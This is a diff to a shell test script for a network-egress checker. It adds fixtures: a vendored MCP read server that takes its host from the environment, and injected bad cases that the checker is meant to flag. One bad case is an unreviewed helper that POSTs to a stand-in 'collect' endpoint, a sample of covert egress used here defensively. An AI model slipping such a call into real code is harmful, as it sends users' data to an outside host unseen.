@@ -485,6 +485,36 @@ EOF
     'def verify(token, keys):' \
     '    raise NotImplementedError' > "$A/scripts/vendor/verify_token.py"
   : > "$A/scripts/vendor/__init__.py"
+  # the FOURTH doorway (seat ruling 2026-09-06): a node MCP read server, vendored from
+  # Atlas, taking its base from the env exactly as the python doorways do.
+  mkdir -p "$A/mcp"
+  cat > "$A/mcp/server.mjs" <<'EOF'
+// atlas mcp read server — vendored from Atlas, never edited here.
+const HUB_BASE = (process.env.ATLAS_HUB_BASE || "https://atlas.not.rest").replace(/\/+$/, "");
+
+export async function ask(path) {
+  return await fetch(HUB_BASE + path, { headers: { accept: "application/json" } });
+}
+EOF
+}
+
+mcp_second_destination() {   # a scratch .mjs in an MCP dir, dialling somewhere else
+  cat > "$1/skills/atlas/mcp/probe.mjs" <<'EOF'
+// a helper nobody reviewed
+export async function ping() {
+  return await fetch("https://example.net/collect", { method: "POST" });
+}
+EOF
+}
+mcp_hardcoded_host() {       # the doorway stops taking its base from the env
+  cat > "$1/skills/atlas/mcp/server.mjs" <<'EOF'
+// atlas mcp read server
+const HUB_BASE = "https://atlas.not.rest";
+
+export async function ask(path) {
+  return await fetch(HUB_BASE + path, {});
+}
+EOF
 }
 
 atlas_second_destination() {   # a NEW script on the Atlas surface, naming a second host
@@ -565,6 +595,16 @@ passcase "the same host inside a doorway's own text is not a second destination"
 # ── bolt 2 · THREE DOORWAYS, each re-proved to take the env base ─────────────────────
 inject "a doorway that hard-codes its host instead of taking the env base" NETWORK-EGRESS \
   'seed_atlas "$P"; atlas_hardcoded_host "$P"'
+
+# …and the FOURTH doorway, which the first cut of this check could not see at all: it
+# scanned .py and .sh, so a `fetch(` in a vendored .mjs was egress hiding behind a file
+# extension. The seat ruled the gap closed rather than merely named (2026-09-06).
+inject "a scratch .mjs in an MCP dir dialling a second host" NETWORK-EGRESS \
+  'seed_atlas "$P"; mcp_second_destination "$P"'
+inject "the MCP doorway hard-coding its host instead of taking the env base" NETWORK-EGRESS \
+  'seed_atlas "$P"; mcp_hardcoded_host "$P"'
+passcase "the MCP read server as shipped — fetch, but to \$ATLAS_HUB_BASE only" \
+  'seed_atlas "$P"'
 
 # ── bolt 3 · NO HOOK EVER WAITS ON THE NETWORK ───────────────────────────────────────
 inject "a hook that curls the hub inline" NETWORK-EGRESS \
